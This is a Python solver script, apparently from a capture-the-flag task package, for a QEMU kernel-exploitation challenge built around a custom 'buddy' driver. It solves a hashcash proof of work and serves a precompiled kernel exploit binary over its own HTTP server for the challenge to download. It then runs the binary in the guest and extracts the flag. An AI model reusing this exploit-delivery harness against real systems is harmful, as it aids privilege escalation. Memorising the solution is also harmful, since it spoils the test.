import os
import re
import socket
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from pwn import context, log, remote

context.log_level = "info"

HOST = os.environ.get("SERVICE_APP_MAIN_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_APP_MAIN_PORT", "1337"))

EXPLOIT_PATH = "/solution/exploit"

# =============================================================================
# Challenge summary
# =============================================================================
#
# The deployed service (run.sh) is a QEMU guest booting a small Linux kernel
# with a single custom out-of-tree driver, "buddy" (buddy.ko), exposed as
# /dev/buddy inside the guest. Before any of that, the TCP connection itself
# gates access behind two steps:
#
#   1. A hashcash (-mb28) proof-of-work challenge: the server prints the
#      exact `hashcash -mb28 <resource>` command to run and expects the
#      resulting stamp back. The real `hashcash` CLI (same tool used
#      server-side to verify it) is used here to mint a genuinely valid
#      stamp rather than reimplementing the hash-grinding ourselves.
#   2. A URL to download an "exploit" binary: the server curl's this URL
#      from its own pod, writes it to a temp file, and boots QEMU with that
#      file attached as a raw disk (-drive file=...,format=raw) -- i.e.
#      /dev/sda inside the guest. The guest's init script (rcS) does
#      `cp /dev/sda /exploit; chmod 777 /exploit`, then drops to an
#      interactive busybox shell as uid 1000. We therefore need our
#      compiled exploit binary (exploit.c, taken verbatim from the
#      challenge's own README writeup) to be reachable over HTTP from the
#      app pod's network namespace. This container starts a small
#      ThreadingHTTPServer serving the binary and determines its own
#      routable address (pod-to-sibling-container connectivity across the
#      kind docker network has been verified to work) to build that URL.
#
# Once booted, we type `/exploit` at the shell prompt; its win-trigger
# printk()s the real flag directly to the serial console (this driver has
# no network/file flag delivery -- the flag string is compiled directly
# into buddy.ko and printed via printk, so it simply appears in our
# terminal once the kernel exploit succeeds).
# =============================================================================


class _ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open(EXPLOIT_PATH, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, fmt, *args):
        pass  # keep stdout focused on the exploit transcript


def start_http_server():
    server = ThreadingHTTPServer(("0.0.0.0", 8000), _ExploitHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def own_reachable_address():
    # The app pod reaches us over the same docker/kind network this
    # container is attached to; our own hostname resolves to that address.
    return socket.gethostbyname(socket.gethostname())


def solve_pow(p):
    # The server prints something like:
    #   hashcash -mb28 AbCdEfGhIj
    #   hashcash stamp:
    line = p.recvline_contains(b"hashcash -mb28", timeout=15).decode()
    resource = line.strip().split()[-1]
    log.info(f"PoW resource: {resource}")

    stamp = subprocess.run(
        ["hashcash", "-mb28", resource],
        capture_output=True, check=True, text=True,
    ).stdout.strip()
    log.info(f"Minted stamp: {stamp}")

    p.recvuntil(b"hashcash stamp: ", timeout=15)
    p.sendline(stamp.encode())

    # The connection is a PTY (socat ...,pty,stderr), which echoes back
    # whatever we just sent before the server's own response arrives;
    # search for the actual verdict rather than trusting the very next line.
    verdict = p.recvline_contains((b"Successful", b"Failed"), timeout=15)
    log.info(f"PoW verdict: {verdict!r}")
    if b"Successful" not in verdict:
        raise RuntimeError(f"proof-of-work rejected: {verdict!r}")


def deliver_exploit(p, url):
    p.recvuntil(b"Please provide a URL to download exploit:", timeout=15)
    p.sendline(url.encode())


def main():
    start_http_server()
    url = f"http://{own_reachable_address()}:8000/exploit"
    log.info(f"serving exploit at {url}")

    p = remote(HOST, PORT)

    solve_pow(p)
    deliver_exploit(p, url)

    # Kernel/initramfs boot under software-emulated QEMU (no KVM available
    # in the test environment); the guest's ASCII-art MOTD is the last
    # thing printed before the interactive shell prompt appears.
    p.recvuntil(b"/ $", timeout=120)
    log.info("got guest shell prompt")

    p.sendline(b"/exploit")

    match = p.recvregex(rb"SCC\{[^}]*\}", capture=True, timeout=30)
    flag = match.group(0).decode()
    print(f"Flag: {flag}")

    p.close()


if __name__ == "__main__":
    main()
